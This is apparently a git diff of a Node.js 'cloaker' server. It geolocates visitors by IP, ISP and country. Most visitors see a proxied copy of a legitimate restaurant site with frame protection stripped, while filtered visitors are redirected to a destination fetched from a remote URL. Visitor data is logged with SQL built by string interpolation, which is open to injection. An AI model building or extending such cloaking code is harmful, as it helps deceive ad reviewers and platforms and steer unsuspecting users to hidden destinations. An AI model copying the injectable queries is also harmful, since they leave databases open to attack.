@@ -15,16 +15,30 @@ app.use(express.static(__dirname));
 var blocked_isp = []
 var blocked_geo = ['Italy']
 var blackl_isp = []
-var koa = require('koa');
-var proxy = require('koa-proxy');
+var Koa = require('koa');
+const koaProxy = require('koa-proxies')
 const mysql = require('serverless-mysql')
 
+
+const app2 = new Koa()
+
+
+var surl = 'https://savorjapan.com/'
+var murl = 'https://www.careerclip.com/fetch.php'
+app2.use(koaProxy('/', {
+  target: surl,
+  changeOrigin: true,
+  logs: true,
+  autoRewrite: true,
+  overrideResponseHeaders: {
+   "X-Frame-Options": "ALLOW-FROM https://app.blackflow.io"
+   },
+  suppressResponseHeaders: ['X-Frame-Options'] // case-insensitive
+}))
 
 
 app.use(requestIp.mw())
 
-var surl = 'https://www.google.com'
-var murl = 'https://www.careerclip.com/fetch.php'
 
 const db = mysql({
   config: {
@@ -37,7 +51,7 @@ const db = mysql({
 
 
 
-app.get("/", (req, res, next) => {
+app.get("/",async (req, res, next) => {
 
 console.log("IP: "+process.env.MYSQL_HOST)
 
@@ -66,28 +80,23 @@ console.log("IP: "+process.env.MYSQL_HOST)
 					    var geo = JSON.parse(data).country || "empty"
 					    console.log(date+isp+geo)
 					    	if(blocked_isp.includes(JSON.parse(data).isp) == false){
-									request({uri: surl}, 
-								    async function(error, response, body) {
-								    const users = await db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+									const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+									  
 									
-									res.status(200).write(body.replace('src="/','src="'+surl+'/').replace('href="/','href="'+surl+'/'));
-									res.end();
-								  });
+									res.status(200).redirect('http://localhost:5500/');res.end();
 					    	} else{
 					    		if(blocked_geo.includes(JSON.parse(data).country) == false){
-						    		request({uri: surl}, 
-								    async function(error, response, body) {
-								    const users = await db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+						    		const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
-									res.status(200).write(body.replace('src="/','src="'+surl+'/').replace('href="/','href="'+surl+'/'));
-									res.end();
-								  });
+									
+									res.status(200).redirect('http://localhost:5500/');res.end();
 					    		}else{
-					    		request({uri: surl}, 
+					    		request({uri: murl}, 
 								    async function(error, response, body) {
-								    const users = await db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+								    const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
-									res.status(200).write(body.replace('src="/','src="'+surl+'/').replace('href="/','href="'+surl+'/'));
+									
+									res.status(200).redirect(body);
 									res.end();
 								  });
 								
@@ -98,13 +107,10 @@ console.log("IP: "+process.env.MYSQL_HOST)
 					    var isp = JSON.parse(data).isp || "empty"
 					    var geo = JSON.parse(data).country || "empty"
 					    console.log(date)
-					    		request({uri: surl}, 
-								    async function(error, response, body) {
-								    const users = await db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+					    		const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
-									res.status(200).write(body.replace('src="/','src="'+surl+'/').replace('href="/','href="'+surl+'/'));
-									res.end();
-								  });
+									
+									res.status(200).redirect('http://localhost:5500/');res.end();
 					    }
 				  })
 				}).on('error', function(e) {  console.log(e) ;});
@@ -112,15 +118,11 @@ console.log("IP: "+process.env.MYSQL_HOST)
 			}
 			else
 			{
-				request(
-					{uri: surl}, 
-								    async function(error, response, body) {
-								    const users = await db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+					const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
-									res.status(200).write(body);
-									res.end();
-								  });
-				return 	next();
+									
+									res.status(200).redirect('http://localhost:5500/');res.end();
+					    		
 			}
 	});
 });
@@ -191,6 +193,11 @@ app.post("/blackl", (req, res) => {
   blocked_geo = req.body.bgeo;
   res.send({ status: "Your domain's blacklist has been updated" });
 });
+
+ const server = app2.listen(5500, () => {
+   console.log(`Koa is running on port 5500`)
+ })
+
 // Listen on port 5000
 app.listen(process.env.PORT || 5000, () => {
   console.log(`Server is booming on port 5000
